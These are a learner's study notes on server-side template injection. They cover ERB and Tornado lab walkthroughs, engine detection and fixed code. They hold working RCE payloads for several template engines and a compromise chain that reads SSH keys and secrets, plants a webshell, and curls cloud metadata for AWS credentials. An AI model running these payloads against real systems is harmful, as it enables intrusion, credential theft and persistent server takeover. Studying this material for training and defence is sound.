# Day 36 Notes — SSTI (Server Side Template Injection)

---

## 1. What We Did Today Overview

- Completed Lab 1: Basic SSTI — detected ERB (Ruby) template engine using Intruder, achieved RCE via `system()`, deleted `morale.txt` to solve the lab
- Completed Lab 2: SSTI in code context — detected Tornado (Python) template engine via the preferred name field, achieved RCE via `os.system()` import, deleted `morale.txt` to solve the lab
- Studied the vulnerable source code pattern for both engines
- Built the complete SSTI → RCE → full server compromise chain
- Zero hints used across both labs
- Encountered two template engines not covered in the original plan (ERB and Tornado) — adapted payloads on the fly

---

## 2. The Foundation — Why SSTI Exists

### Part A — Root Cause

Web frameworks use **template engines** to generate dynamic HTML. Instead of hardcoding every page, developers write templates with placeholders that get filled at runtime:

```
Hello {{ name }}!
```

The template engine **evaluates** whatever is inside its delimiter syntax. The vulnerability exists when user input is passed **into the template string itself** — not just into a placeholder variable. When that happens the engine evaluates the user's input as code — not as data.

**The developer's mistake:** using string concatenation or f-strings to embed user input directly into the template string, instead of passing user input as a separate variable value into a static template.

### Part B — Real World Analogy

Imagine a mail merge system. Normal use: the template says `"Dear {{name}}"` and the system fills in "John." Safe — the user only controls the value.

Now imagine someone is allowed to **edit the template itself** and writes `"Dear {{system('cat /etc/passwd')}}"`. The system executes that as a command because it is inside the template engine's evaluation context. The developer never imagined someone would inject code into the template structure — only into the placeholder values.

### Part C — Three Conditions Required

1. The application uses a server-side template engine (Jinja2, Twig, ERB, Tornado, Freemarker, Velocity, Pebble, Smarty)
2. User input is passed **into the template string** — not just into template variables
3. The template engine has access to dangerous objects or functions (almost always true by default)

### Part D — What SSTI Can and Cannot Do

**Can do:**
- Execute OS commands — SSTI almost always leads directly to RCE
- Read arbitrary files from the server filesystem
- Access application configuration including secret keys, database passwords, API tokens
- Achieve full server takeover in most cases

**Cannot do:**
- Work client-side — this is server execution, not browser execution (that is XSS)
- Work if user input only goes into template **variables**, not the template **string** itself

### Part E — Real World Context

SSTI vulnerabilities have been found in **Uber, Shopify, and Rockstar Games** bug bounty programs. A Jinja2 SSTI on a Flask application leads to RCE within minutes of discovery. HackerOne payouts range from **$1,000 to $20,000+** because SSTI almost always leads to complete server compromise.

---

## 3. Template Engine Detection Methodology

This is the most important skill for SSTI — before you can exploit, you must identify which engine you are dealing with. Every engine has different syntax and a different RCE path.

### Step 1 — Confirm Injection Exists

Send a plain mathematical expression that is valid syntax in multiple engines:

```
{{7*7}}
```

- If the response contains `49` → injection confirmed, engine is likely Jinja2, Twig, or Tornado
- If the response contains `{{7*7}}` literally → no injection, or engine uses different delimiters
- If the response throws an error → injection likely exists but syntax is wrong for this engine

### Step 2 — Try Other Delimiter Styles

Different engines use different delimiters. If `{{7*7}}` doesn't work, try each of these:

```
${7*7}          → Freemarker, Velocity, Groovy (Java-based engines)
<%= 7*7 %>      → ERB (Ruby), EJS (JavaScript)
#{7*7}          → Ruby string interpolation
*{7*7}          → Spring Expression Language (Java/Spring)
{{7*7}}         → Jinja2 (Python/Flask), Twig (PHP), Tornado (Python)
{7*7}           → Smarty (PHP)
```

Send each one and check the response. Whichever returns `49` tells you the delimiter style the engine uses.

### Step 3 — Distinguish Between Engines Using the Same Delimiter

Several engines share `{{ }}` syntax. Use this payload to separate them:

```
{{7*'7'}}
```

| Engine | Returns | Why |
|---|---|---|
| Jinja2 (Python) | `7777777` | Python string multiplication — `'7' * 7` = repeat string 7 times |
| Twig (PHP) | `49` | PHP numeric coercion — `7 * '7'` = `7 * 7` = 49 |
| Tornado (Python) | `7777777` | Same as Jinja2 — Python string multiplication |

Additional distinguishing payload for Tornado vs Jinja2:

```
{% import os %}{{ os.system('id') }}
```

- Works in Tornado — uses Python import syntax inside template blocks
- Fails in Jinja2 — Jinja2 uses different import mechanism (`{% set ... %}` or globals)

### Step 4 — Use Intruder for Automated Detection (What Ainz Did in Lab 1)

Instead of manually trying each payload one by one, load a wordlist of all detection payloads into Burp Intruder:

1. Intercept request with the potentially vulnerable parameter
2. Send to Intruder → mark the parameter value as the injection point
3. In Payloads tab — paste a list of detection payloads:

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
{7*7}
${{7*7}}
#{7*7}
@(7*7)
```

4. Start attack → look at responses — whichever returns `49` in the response body tells you which syntax works
5. Intruder highlights length differences — a longer response usually means the expression was evaluated and output was added

### Complete Engine Identification Decision Tree

```
Send {{7*7}}
    ↓
Returns 49?
    ├── YES → Send {{7*'7'}}
    │           ├── Returns 7777777 → Jinja2 or Tornado (Python)
    │           │   └── Try {% import os %} → works = Tornado, fails = Jinja2
    │           └── Returns 49 → Twig (PHP)
    └── NO → Send <%= 7*7 %>
                ├── Returns 49 → ERB (Ruby) or EJS (JavaScript)
                │   └── Check tech stack — Ruby app = ERB, Node.js app = EJS
                └── NO → Send ${7*7}
                            ├── Returns 49 → Freemarker or Velocity (Java)
                            └── NO → Try *{7*7} → Spring Expression Language
```

### RCE Payload Reference by Engine

| Engine | Language | RCE Payload |
|---|---|---|
| Jinja2 | Python | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Tornado | Python | `{%import os%}{{os.system('id')}}` |
| Twig | PHP | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| ERB | Ruby | `<%= system("id") %>` or `<%= `id` %>` |
| Freemarker | Java | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Velocity | Java | `#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(null,'id')` |
| Smarty | PHP | `{php}echo system('id');{/php}` |

---

## 4. Lab 1 — Basic SSTI (ERB Ruby Engine)

### Lab Name
Basic server-side template injection

### The Engine Discovery

Used Burp Intruder with detection payloads. The payload `<%= 7*7 %>` returned `49` in the response — confirming ERB (Embedded Ruby) template engine.

**What ERB is:** ERB is Ruby's built-in template engine. It uses `<% %>` for code execution and `<%= %>` for code execution with output. It is built into Ruby's standard library — Rails applications use it by default for view rendering.

**Why `<%= %>` specifically:** The `%=` variant means "execute this code AND output the result." Plain `<% %>` executes code but produces no output. For file deletion we use `<% %>` style (or just `<%= %>` since `system()` returns a boolean anyway). For data exfiltration we need `<%= %>` to see the output.

### The Injection Point

URL parameter `message` in a GET request — the parameter value is rendered directly into the page via the ERB template engine without sanitisation.

### Detection — Exact Request Sent

```
GET /?message=<%25%3d+system("whoami")+%25> HTTP/2
Host: 0a3c00750464d8ea80d6e5b300ca009e.web-security-academy.net
Cookie: session=7pKUZPQa7HfmMvYE9tdE6Ob4w4JUji6a
```

**URL encoding breakdown — why the payload is encoded:**

The raw payload is: `<%= system("whoami") %>`

In a URL, certain characters have special meaning and must be percent-encoded:
- `%` → `%25` (percent sign itself must be encoded, otherwise the browser interprets what follows as an existing percent-encoded sequence)
- `=` → `%3d` (equals sign can interfere with URL parameter parsing)
- `<` and `>` — kept raw here but sometimes also encoded as `%3c` and `%3e`
- `+` represents a space (URL encoding for space in query strings)

So `<%25%3d+system("whoami")+%25>` decodes to `<%= system("whoami") %>`.

**What `system("whoami")` does in Ruby:**
- `system()` is a Ruby Kernel method that runs a shell command
- It executes the command in a subprocess via `/bin/sh`
- It prints the command output directly to stdout
- It returns `true` if the command succeeded, `false` if it failed
- That is why the response contains both `carlos` (the command output) AND `true` (the return value of `system()`)

### Exact Output Received — Detection

```html
<header class="notification-header">
</header>
<section class="ecoms-pageheader">
    <img src="/resources/images/shop.svg">
</section>
<div>carlos
true
</div>
```

**Interpreting this output:**
- `carlos` — this is the output of `whoami` — the server process is running as user `carlos`
- `true` — this is the return value of `system()` — the command succeeded
- Both values were substituted into the page because `<%= %>` outputs the result of the expression

### Directory Listing — Exact Request Sent

```
GET /?message=<%25%3d+system("ls")+%25> HTTP/2
```

### Exact Output Received — Directory Listing

```html
<div>morale.txt
true
</div>
```

**What this tells us:**
- `ls` ran in the current working directory of the web process
- Only one file present: `morale.txt`
- This is the file the lab wants deleted

### Lab Solution — Exact Request Sent

```
GET /?message=<%25%3d+system("rm+morale.txt")+%25> HTTP/2
```

**What `rm morale.txt` does:**
- `rm` is the Unix remove command — permanently deletes a file
- `morale.txt` is the filename in the current directory
- `+` in the URL encodes to a space — so the server receives `rm morale.txt`
- `system()` runs this via the shell — the file is deleted
- Returns `true` — deletion succeeded

### Why It Worked — The Full Mechanism

**What the vulnerable Ruby/ERB code looks like:**

```ruby
# Vulnerable ERB rendering
require 'erb'

get '/' do
  message = params[:message]
  # VULNERABLE — user input passed directly into ERB template string
  template = ERB.new("<html><div>#{message}</div></html>")
  template.result
end
```

**Line by line:**

**`message = params[:message]`**
Reads the `message` URL parameter. This is fine on its own — just reading input.

**`ERB.new("<html><div>#{message}</div></html>")`**
Ruby string interpolation (`#{}`) embeds `message` directly into the template string at the Ruby level — before ERB ever processes it. If `message` is `<%= system("whoami") %>` the template string becomes `<html><div><%= system("whoami") %></div></html>`. The ERB delimiters are now inside the template.

**`template.result`**
ERB processes the template. It sees `<%= system("whoami") %>` — executes the Ruby expression `system("whoami")` — the OS command runs — output is embedded in the HTML response.

**What the safe version looks like:**

```ruby
# Safe ERB rendering
require 'erb'

get '/' do
  message = params[:message]
  # SAFE — message passed as a variable, template string is static
  template = ERB.new("<html><div><%= message %></div></html>")
  template.result(binding)
end
```

In the safe version `message` is a Ruby variable in the binding context. ERB sees `<%= message %>` — a variable reference — and outputs its string value. Even if the value contains `<%= system("whoami") %>` it is output as plain text, never evaluated.

---

## 5. Lab 2 — SSTI in Code Context (Tornado Python Engine)

### Lab Name
Server-side template injection in a code context

### The Engine Discovery

The injection point was the **preferred name field** on the `/my-account` page. Testing `{{7*7}}` returned `49` — confirming `{{ }}` delimiter style. Testing `{{7*'7'}}` returned `7777777` — confirming Python-based engine (Jinja2 or Tornado). Testing `{%import os%}` worked — confirming **Tornado**.

**What Tornado is:** Tornado is a Python web framework and async networking library. It has its own built-in template engine that uses `{{ }}` for expressions and `{% %}` for statements (like `{% import %}`). Unlike Jinja2, Tornado templates allow direct Python imports inside `{% %}` blocks — which is what made the RCE payload work.

### The Injection Point

The `blog-post-author-display` parameter in a POST request to `/my-account/change-blog-post-author-display`. This field controls how the author name is displayed on blog posts. It is rendered via the Tornado template engine when the blog post page loads.

**Why this is a "code context" injection:**
The field is injected into an existing template expression — not into plain HTML. The template already contains `{{ }}` delimiters, and the user input lands inside them. This means the closing `}}` must be injected first to break out of the existing expression before injecting new code.

### RCE — Exact Request Sent

```http
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0a0300b00361c73b80467b170073002b.web-security-academy.net
Cookie: session=sbnSy55acjuMt5WxZxOIm2WdPfrGtAcz
Content-Type: application/x-www-form-urlencoded

blog-post-author-display=user.name}}{%import os%}{{os.system('whoami')}}&csrf=7FUtEUpnwCWFb2okY0EtF8DGO2z1S7mZ
```

### The Payload Broken Down

```
user.name}}{%import os%}{{os.system('whoami')}}
```

This payload is more complex than Lab 1. Here is exactly what each piece does:

**`user.name`**
This is the legitimate value the field expects — the user's name. It is included first to satisfy the existing template syntax. The template probably looks like `{{ blog-post-author-display }}` internally — so `user.name` fills the expected expression.

**`}}`**
Closes the existing `{{ }}` expression that the server opened. Without this, everything after would be inside the first expression and cause a syntax error. We are **breaking out** of the existing template context.

**`{%import os%}`**
Opens a Tornado template statement block (`{% %}`). `import os` imports Python's `os` module — which provides `os.system()` for command execution. This is a Tornado-specific feature — Jinja2 does not allow direct imports like this. In Tornado templates `{% %}` blocks can contain arbitrary Python statements.

**`{{os.system('whoami')}}`**
Opens a new expression block. Now that `os` is imported, `os.system('whoami')` executes the `whoami` shell command. The return value (0 for success) is output into the page.

**Full template after injection (what the server sees):**

```
{{ user.name }}{% import os %}{{ os.system('whoami') }}
```

The first expression outputs the username. The import statement loads os. The second expression runs the command.

### Exact Output Observed

After saving the payload and visiting any blog post as the author:

```
carlos Peter Wiener0
```

**Interpreting this output:**
- `carlos` — output of `whoami` — server process user
- `Peter Wiener` — the actual user's display name (rendered by `user.name`)
- `0` — return value of `os.system()` — 0 means the command succeeded (Unix exit code convention — 0 = success, non-zero = error)

**Why `os.system()` returns `0` not the command output:**
`os.system()` in Python returns the **exit code** of the command — not its output. The actual `whoami` output went to stdout of the server process (not the HTTP response). To capture the output you would use `os.popen('whoami').read()` instead. But `0` still proves RCE — the command ran.

### Lab Solution — Exact Payload Used

```
blog-post-author-display=user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')}}&csrf=7FUtEUpnwCWFb2okY0EtF8DGO2z1S7mZ
```

**What changed:** `whoami` replaced with `rm /home/carlos/morale.txt`. The full path is used because the working directory of the web process may not be `/home/carlos`. Using the absolute path guarantees the correct file is deleted regardless of where the process is running.

After saving and reloading the page — the "Congratulations, you solved the lab!" banner appeared.

### Why It Worked — The Vulnerable Code Pattern

```python
# Vulnerable Tornado template rendering
import tornado.template

class BlogHandler(tornado.web.RequestHandler):
    def get(self, post_id):
        author_display = self.get_cookie("author_display_pref")
        # VULNERABLE — user preference injected into template string
        template_str = f"<span>By: {{{{{author_display}}}}}</span>"
        t = tornado.template.Template(template_str)
        self.write(t.generate())
```

**Line by line:**

**`author_display = self.get_cookie("author_display_pref")`**
Reads the author display preference from a cookie or database. The attacker controls this value via the account settings form.

**`template_str = f"<span>By: {{{{{author_display}}}}}</span>"`**
Python f-string embeds `author_display` into the template string. The double `{{` and `}}` in f-strings are escaped braces — they produce literal `{` and `}`. So the template becomes `<span>By: {{user.name}}</span>` normally. But when the attacker sets `author_display` to `user.name}}{%import os%}{{os.system('id')}}` — the template string becomes malformed and the injected code gets evaluated.

**`t = tornado.template.Template(template_str)`**
Tornado compiles the template — including the injected statements and expressions.

**`t.generate()`**
Tornado executes the compiled template — running the attacker's `import os` and `os.system()` calls.

### The Fixed Code

```python
# Safe Tornado template rendering
import tornado.template

AUTHOR_TEMPLATE = tornado.template.Template("<span>By: {{ author_name }}</span>")

class BlogHandler(tornado.web.RequestHandler):
    def get(self, post_id):
        author_display = self.get_cookie("author_display_pref")
        # SAFE — template is static, user input passed as variable
        self.write(AUTHOR_TEMPLATE.generate(author_name=author_display))
```

**Why this is safe:** The template string `"<span>By: {{ author_name }}</span>"` is static — compiled once at startup. User input is passed as the value of `author_name`. Tornado outputs it as escaped text — `{{ }}` in variable values are never re-evaluated as template code.

---

## 6. What Failed and Why

Nothing failed today. Both labs were solved without hints.

**Observation from Lab 2 — why the full path was needed:**
`rm morale.txt` would fail if the web process's working directory is not `/home/carlos`. Using the absolute path `rm /home/carlos/morale.txt` guaranteed the correct file was targeted. Always use absolute paths in SSTI/RCE payloads to avoid working directory ambiguity.

**Observation about `os.system()` vs `os.popen()`:**
In Lab 2, `os.system('whoami')` showed `0` in the page (the exit code) rather than `carlos` (the command output). This is because `os.system()` sends output to the server's stdout, not to the return value. For data exfiltration you need `os.popen('command').read()` which captures stdout and returns it as a string. For destructive actions like `rm` the return code is sufficient proof.

---

## 7. Vulnerable Source Code Summary

### ERB (Ruby) — Vulnerable vs Safe

```ruby
# VULNERABLE
message = params[:message]
template = ERB.new("<div>#{message}</div>")  # Ruby interpolation before ERB parsing
template.result

# SAFE
message = params[:message]
template = ERB.new("<div><%= message %></div>")
template.result(binding)  # message is a variable in binding, never evaluated as code
```

### Tornado (Python) — Vulnerable vs Safe

```python
# VULNERABLE
user_input = get_user_preference()
template_str = f"<span>{{ {user_input} }}</span>"  # f-string embeds input before template parsing
t = tornado.template.Template(template_str)
t.generate()

# SAFE
user_input = get_user_preference()
t = tornado.template.Template("<span>{{ user_input }}</span>")
t.generate(user_input=user_input)  # input is a variable value, never template code
```

### The Universal Fix Principle

The fix is the same regardless of the template engine: **never build a template string using user input**. The template string must be static. User input must only ever be passed as a named variable to the template at render time. The engine then treats variable values as data to display — never as code to execute.

---

## 8. Chain Thinking — SSTI → RCE → Full Server Compromise

### Chain 1 — ERB/Ruby App

```
SSTI found in message parameter (ERB engine)
        ↓
RCE confirmed: <%= system("whoami") %> → carlos
        ↓
Read application secrets:
<%= system("cat /var/www/app/config/database.yml") %>
→ database host, username, password exposed
        ↓
Read environment variables (often contain API keys):
<%= system("env") %>
→ SECRET_KEY_BASE, AWS_ACCESS_KEY_ID, DATABASE_URL exposed
        ↓
Read SSH private keys:
<%= system("cat /home/carlos/.ssh/id_rsa") %>
→ SSH into server directly — persistent access beyond the web app
        ↓
Upload persistent webshell:
<%= system("echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php") %>
        ↓
Complete long-term server access
```

### Chain 2 — Tornado/Python App on AWS

```
SSTI found in author display field (Tornado engine)
        ↓
RCE confirmed: {%import os%}{{os.popen('whoami').read()}} → carlos
        ↓
Fetch AWS metadata credentials via RCE:
{%import os%}{{os.popen('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/').read()}}
→ IAM role name returned
        ↓
{%import os%}{{os.popen('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME').read()}}
→ AccessKeyId + SecretAccessKey + Token returned
        ↓
Full AWS infrastructure access — same end state as XXE + SSRF from Day 35
but achieved via RCE instead of server-side request forgery
        ↓
Key insight: SSTI → RCE is more powerful than XXE → SSRF
because RCE can do everything SSRF can plus execute arbitrary code
```

### Severity Table

| Finding | Severity | Reason |
|---|---|---|
| SSTI detected, no RCE yet | High | Code execution primitives confirmed |
| SSTI with RCE confirmed | Critical | Full server compromise possible |
| SSTI + secret key exfiltration | Critical | Forge any session token |
| SSTI + AWS credentials via RCE | Critical+ | Full cloud infrastructure access |

---

## 9. Real World Context

**Uber 2016:** SSTI found in a Flask/Jinja2 application — led to RCE on internal Uber infrastructure. Paid $10,000 bug bounty.

**Shopify:** Multiple SSTI findings across their platform over the years — Liquid template engine (their custom engine) is generally safe but misconfigurations still surface.

**Why SSTI appears in real apps:**
- Developers building email template features let users customise the template — they pass user-defined template strings to the engine directly
- Error pages that reflect URL parameters or headers through a template engine
- Report generators that embed user-supplied field names into template expressions
- CMS platforms with custom page builder features

**Bug bounty approach:**
- Target: any input that is reflected in the response — search boxes, name fields, URL parameters, user preferences, email templates
- First check: does `{{7*7}}` or `<%= 7*7 %>` return `49`?
- If yes: identify engine via distinguishing payloads, then use the matching RCE payload
- Report severity: Critical if RCE achieved, High if injection confirmed but RCE blocked

---

## 10. The Fix

### The Problem (Language Agnostic)

The vulnerability always comes down to the same pattern regardless of the language or engine:

```
VULNERABLE: template = engine(f"Hello {user_input}!")
SAFE:       template = engine("Hello {{ name }}!")
            template.render(name=user_input)
```

In the vulnerable version user input becomes part of the template before the engine runs — so the engine treats it as code. In the safe version the template is static and user input is a data value — the engine treats it as a string to display.

### Defense in Depth

1. **Never concatenate user input into template strings** — always pass user input as named variables at render time
2. **Use sandboxed template environments** — Jinja2's `SandboxedEnvironment` restricts access to dangerous Python internals even if injection occurs
3. **Input validation** — if a field only needs a name, reject input containing `{{`, `}}`, `<%`, `%>`, `{%`, `%}` delimiters before it reaches the template engine
4. **Least privilege** — run the web server process as a restricted user so even if RCE is achieved the damage is limited
5. **Use logic-less templates** — Mustache is a template engine with no code execution capability at all — `{{name}}` can only output a variable value, never execute code

### What Does NOT Fix SSTI

- Escaping HTML special characters (`<`, `>`, `&`) — template injection does not need these characters to execute
- HTTPS/TLS — encryption has nothing to do with template evaluation
- WAF blocking `system` or `os` keywords — attackers can use string concatenation, base64 encoding, or alternative execution methods to bypass keyword filters
- Validating the output — too late, the command already ran

---

## 11. Key Concepts Summary

| Term | Meaning |
|---|---|
| Template engine | Software that generates HTML by evaluating a template with placeholder syntax |
| ERB | Embedded Ruby — Ruby's built-in template engine, uses `<%= %>` and `<% %>` |
| Tornado | Python web framework with its own template engine using `{{ }}` and `{% %}` |
| Jinja2 | Python template engine for Flask, uses `{{ }}` and `{% %}` |
| Twig | PHP template engine, uses `{{ }}` and `{% %}` |
| SSTI | When user input lands inside the template string and is evaluated as code |
| Code context injection | Injection where the user input lands inside an existing template expression — requires breaking out first |
| `<%= %>` | ERB output tag — executes Ruby code and outputs the result |
| `<% %>` | ERB execution tag — executes Ruby code without outputting |
| `system()` | Ruby method to run a shell command, returns true/false |
| `os.system()` | Python method to run a shell command, returns exit code (0 = success) |
| `os.popen().read()` | Python method to run a shell command and capture its stdout output |
| `{% import os %}` | Tornado template statement — imports a Python module into the template context |
| Binding (Ruby) | The execution context passed to ERB that contains available variables |
| SandboxedEnvironment | Jinja2 feature that restricts template access to dangerous Python objects |

---

## 12. Payloads Reference

### Detection Payloads (try all until one returns 49)

```
{{7*7}}          → Jinja2, Twig, Tornado
${7*7}           → Freemarker, Velocity (Java)
<%= 7*7 %>       → ERB (Ruby), EJS (JavaScript)
#{7*7}           → Ruby string interpolation
*{7*7}           → Spring Expression Language (Java/Spring)
{7*7}            → Smarty (PHP)
```

### Engine Identification (after {{7*7}} confirms injection)

```
{{7*'7'}}
→ 7777777 = Jinja2 or Tornado (Python)
→ 49 = Twig (PHP)

{%import os%}{{os.system('id')}}
→ works = Tornado
→ fails = Jinja2 (use different import method)
```

### ERB (Ruby) — RCE Payloads

```erb
<!-- Execute command and output result -->
<%= system("id") %>

<!-- Capture and output command output (backtick execution) -->
<%= `id` %>

<!-- Read a file -->
<%= File.read('/etc/passwd') %>

<!-- List directory -->
<%= system("ls /home") %>

<!-- Delete file -->
<%= system("rm /home/carlos/morale.txt") %>

<!-- Read environment variables -->
<%= system("env") %>

<!-- Read application config -->
<%= File.read('/var/www/app/config/database.yml') %>
```

**URL-encoded versions (for use in GET parameters):**
```
<%25%3d+system("id")+%25>                    → <%= system("id") %>
<%25%3d+`id`+%25>                            → <%= `id` %>
<%25%3d+File.read('/etc/passwd')+%25>        → <%= File.read('/etc/passwd') %>
<%25%3d+system("rm+/home/carlos/morale.txt")+%25>
```

### Tornado (Python) — RCE Payloads

```python
# Execute command (returns exit code 0, output goes to server stdout)
{%import os%}{{os.system('id')}}

# Execute command and capture output (shows output in page)
{%import os%}{{os.popen('id').read()}}

# Read a file
{%import os%}{{os.popen('cat /etc/passwd').read()}}

# Code context injection (break out of existing expression first)
user.name}}{%import os%}{{os.system('id')}}

# Code context + capture output
user.name}}{%import os%}{{os.popen('id').read()}}

# Delete file (absolute path)
user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')}}

# Read AWS metadata
user.name}}{%import os%}{{os.popen('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/').read()}}
```

### Jinja2 (Python/Flask) — RCE Payloads

```python
# Simple RCE using config object
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Read a file
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Full subclasses approach (if config method is blocked)
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen in the list, note its index, then:
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}
```

### Twig (PHP) — RCE Payloads

```php
// Register exec as a filter callback then call it
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Alternative using system
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

---

## 13. Foundation Checklist

1. **What is the developer mistake that causes SSTI?**
   The developer embeds user input directly into the template string using string concatenation or f-string interpolation before passing it to the template engine. The engine receives user content as part of the template code — not as a data value — and evaluates it. The fix is to keep the template string static and pass user input as a named variable at render time.

2. **You test `{{7*7}}` and get `49`. You then test `{{7*'7'}}` and get `7777777`. What does this tell you?**
   The engine uses `{{ }}` delimiters and evaluates Python string multiplication — confirming the engine is either Jinja2 or Tornado. The next step is to try `{%import os%}{{os.popen('id').read()}}` — if it works the engine is Tornado; if it fails use the Jinja2 `config.__class__...` payload instead.

3. **You test `{{7*7}}` and get `49`. You then test `{{7*'7'}}` and get `49`. What is this engine and what is the RCE payload?**
   The engine is Twig (PHP). The RCE payload is: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`. Twig coerces the string `'7'` to the number `7` and performs numeric multiplication — giving `49` instead of the Python string repetition `7777777`.

4. **Why does `os.system('whoami')` show `0` in the page but `os.popen('whoami').read()` shows `carlos`?**
   `os.system()` executes the command and sends its output to the server's stdout (the terminal/log), then returns the integer exit code (0 for success). The `0` that appears in the page is the return value of `os.system()` — not the command output. `os.popen()` opens a pipe to the command's stdout, and `.read()` captures that output as a string — which then gets embedded in the page. For data exfiltration always use `os.popen('cmd').read()`.

5. **In Lab 2, why did the payload start with `user.name}}` instead of just `}}`?**
   The injection is in a "code context" — the user input lands inside an existing template expression that the server opened. The server's template probably looks like `{{ user_preference }}` internally. If we just inject `}}` the engine sees `{{ }}` which is an empty expression — a syntax error. Starting with `user.name` fills the existing expression with a valid value (`user.name` outputs the username), then `}}` closes it cleanly. Everything after is fresh template code the engine processes normally.

6. **An app reflects user input via a template engine but you only see `0` in the response no matter what command you run. What does this tell you and what do you do?**
   The app is using `os.system()` which returns an exit code instead of capturing output. The vulnerability still exists — commands are executing. Switch to a payload that captures output: `os.popen('id').read()` for Tornado/Jinja2, or backtick execution `` `id` `` for ERB. If those are also blocked try writing output to a file: `os.system('id > /tmp/out.txt')` then `os.popen('cat /tmp/out.txt').read()`.

---
